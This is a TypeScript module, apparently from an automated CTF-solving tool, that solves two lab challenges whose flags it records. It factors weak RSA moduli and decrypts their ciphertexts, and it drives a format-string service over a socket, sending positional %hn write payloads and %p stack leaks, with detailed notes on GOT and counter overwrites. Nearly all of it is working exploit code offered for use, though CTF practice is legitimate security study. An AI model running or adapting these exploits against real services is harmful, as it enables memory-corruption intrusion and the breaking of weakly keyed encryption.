/**
 * CTF classics — the two techniques the operator proved live on 2026-10-22
 * (ctf_format_string :9002 → T3MP3ST{f0rm4t_str1ng_wr1t3},
 *  ctf_rsa_weak :9101  → T3MP3ST{close_primes_are_factorable}).
 *
 * FORMAT STRING — GOT/counter overwrite via positional %n:
 *   The vuln class: a service reads a line and echoes it with dprintf/printf
 *   (attacker-controlled format). Varargs 1-4 are the register args
 *   (rdx/rcx/r8/r9 — dprintf's fd+fmt consume rdi/rsi); vararg 5+ is the stack,
 *   starting at the input buffer itself. Many training binaries keep a win
 *   counter reachable as a REGISTER vararg (e.g. %1$ = pointer to the counter)
 *   — then the whole exploit is one line: `%{4919}c%1$hn` writes 0x1337
 *   through the pointer. This module leaks the live varargs, classifies the
 *   pattern, builds the write, and drives the socket.
 *
 *   HARD-WON LAYOUT RULES (all lab-proven on the live service):
 *   - Mixing plain + positional (%N$) specifiers is UB in glibc — the write
 *     attempt echoes junk and dies. ALL-positional or ALL-sequential only.
 *   - The address slot for conversion #k (k≥5) is buffer offset 8*(k-5): the
 *     fmt TEXT must fit BEFORE that offset, or the fmt runs over the address
 *     bytes and the %n writes into unmapped stack (SIGSEGV ignored → the
 *     child hangs, nothing flushes — printf output is all-or-nothing).
 *   - dprintf output flushes only on COMPLETION: a crashing fmt produces
 *     silence, not partial output. Silence = the write faulted.
 *   - Fork-per-connection targets: GOT writes live only within one
 *     connection — every stage of the chain must ride one socket.
 *   - Overwriting the GOT entry of the very function the win path calls
 *     internally (dprintf → print_flag which itself calls dprintf) = infinite
 *     recursion before any output. Prefer counter/compare-state writes, or
 *     GOT→getenv (returns NULL=0) for inverted-compare wins.
 *
 * RSA WEAK PRIME — factor a badly-generated modulus and decrypt:
 *   trial division for tiny primes, Fermat for close primes (p≈q), then
 *   d = e⁻¹ mod φ, m = c^d mod n via square-and-multiply (never raw BigInt
 *   ** — a 65537 exponent explodes memory).
 */

import net from 'node:net';

// ---------------------------------------------------------------------------
// RSA — pure BigInt math
// ---------------------------------------------------------------------------

/** Trial division to `limit`, then Fermat (close primes). Returns [p, q]. */
export function factorModulus(n: bigint, opts: { trialLimit?: bigint; fermatSteps?: number } = {}): [bigint, bigint] {
    const limit = opts.trialLimit ?? 100_000n;
    for (let p = 2n; p < limit; p++) {
        if (n % p === 0n) return [p, n / p];
    }
    let a = BigInt(Math.ceil(Math.sqrt(Number(n))));
    if (a * a < n) a += 1n;
    const steps = opts.fermatSteps ?? 10_000_000;
    for (let i = 0; i < steps; i++) {
        const b2 = a * a - n;
        if (b2 < 0n) { a += 1n; continue; }
        const b = BigInt(Math.sqrt(Number(b2)));
        if (b * b === b2) return [a - b, a + b];
        a += 1n;
    }
    throw new Error(`modulus not factored within trial limit ${limit} and ${steps} Fermat steps — not a weak-prime construction`);
}

/** Extended-Euclid modular inverse. */
export function modInverse(a: bigint, m: bigint): bigint {
    let r = m, ro = ((a % m) + m) % m, x = 0n, xOld = 1n;
    while (ro !== 0n) {
        const q = r / ro;
        [r, ro] = [ro, r - q * ro];
        [x, xOld] = [xOld, x - q * xOld];
    }
    if (r !== 1n) throw new Error('no modular inverse (gcd != 1)');
    return ((x % m) + m) % m;
}

/** Square-and-multiply modular exponentiation — NEVER use BigInt ** for crypto exponents. */
export function powMod(base: bigint, exp: bigint, mod: bigint): bigint {
    let result = 1n;
    base %= mod;
    let e = exp;
    while (e > 0n) {
        if (e & 1n) result = (result * base) % mod;
        base = (base * base) % mod;
        e >>= 1n;
    }
    return result;
}

export interface RsaWeakSolve {
    n: bigint;
    e: bigint;
    c?: bigint;
    p: bigint;
    q: bigint;
    d: bigint;
    m?: bigint;
    method: 'trial-division' | 'fermat-close-primes';
    ms: number;
}

/** Factor n and, when a ciphertext is given, decrypt it. */
export function solveRsaWeak(n: bigint, e: bigint, c?: bigint): RsaWeakSolve {
    const started = Date.now();
    let method: 'trial-division' | 'fermat-close-primes' = 'trial-division';
    // distinguish honestly: trial division only if a factor is actually tiny
    const trial: bigint[] = [];
    for (let p = 2n; p < 100_000n; p++) if (n % p === 0n) { trial.push(p); break; }
    let p: bigint, q: bigint;
    if (trial.length) {
        p = trial[0];
        q = n / p;
        method = 'trial-division';
    } else {
        [p, q] = factorModulus(n, { trialLimit: 2n });
        method = 'fermat-close-primes';
    }
    const phi = (p - 1n) * (q - 1n);
    const d = modInverse(e, phi);
    const m = c !== undefined ? powMod(c, d, n) : undefined;
    return { n, e, c, p, q, d, m, method, ms: Date.now() - started };
}

// ---------------------------------------------------------------------------
// Format string — line-based client + leak + counter-write solver
// ---------------------------------------------------------------------------

export interface FsLeak {
    raw: string[];
    /** parsed hex values of %1$p..%k$p */
    args: string[];
    /** index (1-based vararg) whose value looks like a data-segment pointer (0x40xxxx) */
    counterArgIndex: number | null;
    counterValue: string | null;
    /** buffer offset: first stack vararg (≥5) that echoes the marker */
    bufferArgIndex: number | null;
}

export interface FsSolveResult {
    host: string;
    port: number;
    banner: string | null;
    leak: FsLeak | null;
    payload: string | null;
    flag: string | null;
    transcript: string;
    ms: number;
}

const DEFAULT_MARKER = 'ABCDEFGH';

/** Parse a %p leak response into vararg values. */
export function parseLeak(leakLine: string): string[] {
    return (leakLine.match(/0x[0-9a-f]+/gi) || []).map(v => v.toLowerCase());
}

/** Detect the counter-pattern: a 0x40xxxx (data-segment) pointer among register varargs 1-4. */
export function findCounterArg(args: string[]): { index: number; value: string } | null {
    for (let i = 0; i < Math.min(4, args.length); i++) {
        const v = args[i];
        if (/^0x40[0-9a-f]{2,4}$/i.test(v)) return { index: i + 1, value: v.toLowerCase() };
    }
    return null;
}

/**
 * Build a positional %hn write: `%{count}c%{argIndex}$hn`.
 * count = the value written (2 bytes); all-positional, no mixing.
 */
export function buildCounterWrite(argIndex: number, value: number): string {
    if (value <= 0 || value > 0xffff) throw new Error(`%hn writes 2 bytes — value ${value} out of range`);
    return `%${value}c%${argIndex}$hn`;
}

/**
 * Drive a line-echo format-string service end to end:
 * banner → leak (%1$p..%9$p with marker) → classify → counter write → flag.
 * Captures whatever the win prints. One connection throughout (fork-per-
 * connection targets keep GOT/counter state per-child).
 */
export async function solveFormatString(opts: {
    host: string;
    port: number;
    winValue?: number;          // counter target, default 0x1337
    connectMs?: number;
    echoMs?: number;
    marker?: string;
}): Promise<FsSolveResult> {
    const started = Date.now();
    const { host, port } = opts;
    const connectMs = opts.connectMs ?? 1000;
    const echoMs = opts.echoMs ?? 2200;
    const marker = opts.marker ?? DEFAULT_MARKER;
    const winValue = opts.winValue ?? 0x1337;

    const transcript: string[] = [];
    let banner: string | null = null;
    let leak: FsLeak | null = null;
    let payload: string | null = null;
    let flag: string | null = null;

    const sock = net.connect(port, host);
    let rx = '';
    sock.on('data', c => { rx += c.toString('latin1'); });
    const drain = (ms: number) => new Promise<void>(r => setTimeout(() => { transcript.push(rx); rx = ''; r(); }, ms));

    await new Promise<void>((resolve, reject) => {
        sock.once('connect', resolve);
        sock.once('error', reject);
        setTimeout(() => reject(new Error(`connect timeout ${host}:${port}`)), connectMs + 2000);
    });
    await drain(connectMs);
    banner = transcript.join('');
    transcript.length = 0;

    // EMPIRICAL LAW (proven on ctf_format_string): the counter pointer rides a
    // REGISTER vararg only on the FIRST message of a connection — a prior echo
    // consumes it and the write lands on a junk stack slot (harmless, silent).
    // So the win payload goes FIRST; the leak runs only if the win missed.
    payload = buildCounterWrite(1, winValue);
    sock.write(Buffer.concat([Buffer.from(payload), Buffer.from([0x0a])]));

    const deadline = Date.now() + Math.max(echoMs * 3, 9000);
    while (Date.now() < deadline) {
        await new Promise(r => setTimeout(r, 300));
        flag = /T3MP3ST\{[^}]*\}/.exec(rx)?.[0] ?? null;
        if (flag) break;
    }
    transcript.push(rx);
    rx = '';
    if (flag) {
        sock.destroy();
        return { host, port, banner, leak, payload, flag, transcript: transcript.join('\n').slice(0, 4000), ms: Date.now() - started };
    }

    // 2) win missed — leak now, for the operator's diagnosis
    const leakLine = marker + '|%1$p|%2$p|%3$p|%4$p|%5$p|%6$p|%7$p|%8$p|%9$p';
    sock.write(Buffer.concat([Buffer.from(leakLine), Buffer.from([0x0a])]));
    await drain(echoMs);
    const echo = transcript.join('');
    transcript.length = 0;
    const args = parseLeak(echo);
    const counter = findCounterArg(args);
    const markerLE = Buffer.from(marker).readBigUInt64LE();
    let bufferArgIndex: number | null = null;
    args.forEach((v, i) => {
        try { if (BigInt(v) === markerLE) bufferArgIndex = i + 1; } catch { /* skip */ }
    });
    leak = { raw: echo.split('\n'), args, counterArgIndex: counter?.index ?? null, counterValue: counter?.value ?? null, bufferArgIndex };
    if (counter && counter.index !== 1) {
        // the counter rides a different register vararg on this target — one retry
        payload = buildCounterWrite(counter.index, winValue);
        sock.write(Buffer.concat([Buffer.from(payload), Buffer.from([0x0a])]));
        const retryDeadline = Date.now() + Math.max(echoMs * 2, 6000);
        while (Date.now() < retryDeadline) {
            await new Promise(r => setTimeout(r, 300));
            flag = /T3MP3ST\{[^}]*\}/.exec(rx)?.[0] ?? null;
            if (flag) break;
        }
        transcript.push(rx);
    }
    sock.destroy();
    return { host, port, banner, leak, payload, flag, transcript: transcript.join('\n').slice(0, 4000), ms: Date.now() - started };
}
